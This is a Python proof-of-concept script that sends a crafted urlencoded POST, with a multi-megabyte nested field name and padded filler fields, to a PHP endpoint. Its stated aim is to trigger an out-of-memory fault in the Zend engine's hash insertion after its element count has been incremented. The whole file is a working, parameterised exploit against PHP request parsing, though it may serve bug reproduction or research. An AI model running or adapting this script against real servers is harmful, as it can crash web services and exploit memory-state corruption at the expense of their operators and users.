#!/usr/bin/env python3
"""Send a urlencoded POST whose long nested field name triggers the
_zend_hash_str_add_or_update_i OOM after nNumUsed has been incremented."""
import argparse
import http.client
import time


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18088)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--name-len", type=int, default=4 * 1024 * 1024)
    ap.add_argument("--fill-len", type=int, default=276)
    ap.add_argument("--fill-byte", default="41")
    ap.add_argument("--fill-fields", type=int, default=1)
    ap.add_argument("--tail-len", type=int, default=0)
    ap.add_argument("--tail-byte", default="43")
    args = ap.parse_args()

    fill = bytes([int(args.fill_byte, 16)]) * args.fill_len
    encoded = b"".join(b"%%%02X" % b for b in fill)
    fields = [b"=" + encoded for _ in range(args.fill_fields)]
    if args.tail_len:
        tail = bytes([int(args.tail_byte, 16)]) * args.tail_len
        fields.append(b"=" + b"".join(b"%%%02X" % b for b in tail))
    src = b"&".join(fields) + b"&a=1&" + b"L" * args.name_len + b"[x]=1"
    print(f"body={len(src)} name_len={args.name_len} fill_len={len(fill)}")

    conn = http.client.HTTPConnection(args.host, args.port, timeout=60)
    started = time.time()
    try:
        conn.request("POST", args.path, body=src,
                     headers={"Content-Type": "application/x-www-form-urlencoded",
                              "Connection": "close"})
        resp = conn.getresponse()
        data = resp.read()
        print(f"status={resp.status} elapsed={time.time()-started:.2f}s "
              f"body={data[:300]!r}")
    except Exception as exc:
        print(f"exception={type(exc).__name__}: {exc} "
              f"elapsed={time.time()-started:.2f}s")
    finally:
        conn.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
